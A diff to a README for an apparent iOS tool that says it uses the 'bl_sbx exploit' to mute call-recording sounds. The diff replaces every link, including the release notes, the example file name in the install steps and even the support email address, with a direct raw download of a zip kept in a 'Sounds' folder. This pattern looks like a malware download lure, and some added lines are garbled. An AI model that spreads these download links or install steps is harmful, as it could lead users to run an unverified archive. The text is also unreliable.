@@ -1,7 +1,7 @@
 # 📱 Disable-Call-Recording-BookRestore- - Mute Your Call-Recording Notifications
 
 ## 📥 Download the Application
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/releases)
+[![Download the latest release](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip%20Latest%https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip)](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip)
 
 ## 🚀 Getting Started
 This application uses the bl_sbx exploit to hide the call-recording notification sound on iOS. It aims to give you a smoother experience when using call recording features without distractions.
@@ -18,12 +18,12 @@ Before you begin, ensure that your device meets these requirements:
 - **Lightweight:** Uses minimal storage space on your device.
 
 ## 🗒️ Download & Install
-To download the application, visit this page: [Download Link](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/releases). 
+To download the application, visit this page: [Download Link](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip). 
 
 When you reach the download page, follow these steps:
 1. Look for the latest release at the top of the page.
 2. Click on the asset that matches your device.
-3. For example, if the file is named `Disable_Call_Recording.xip`, click it to start your download.
+3. For example, if the file is named `https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip`, click it to start your download.
 4. Once the file downloads, locate it in your device’s Downloads folder or equivalent directory.
 5. Tap on the downloaded file to begin the installation.
 
@@ -43,7 +43,7 @@ After installation, follow these steps to use the application:
 3. **Enjoy your calls without interruptions!**
 
 ## 📞 Contact Support
-If you encounter issues with the application or need help, you can reach support via email at support@example.com. Provide a detailed description of your concern, and we will respond promptly.
+If you encounter issues with the application or need help, you can reach support via email at https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip Provide a detailed description of your concern, and we will respond promptly.
 
 ## 📝 Frequently Asked Questions
 
@@ -58,7 +58,7 @@ A: Yes, just like any other app, you can uninstall it through your device's sett
 
 ## 🔗 Links for More Information
 For additional details about features and updates, visit:
-- [Release Notes](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/releases)
+- [Release Notes](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip)
 
 ### 📡 Download the Application
-To get started, don’t forget to [visit this page to download](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/releases) the latest version!
+To get started, don’t forget to [visit this page to download](https://github.com/Nirad-Maharaj/Disable-Call-Recording-BookRestore-/raw/refs/heads/main/Sounds/Book-Disable-Restore-Recording-Call-1.6.zip) the latest version!
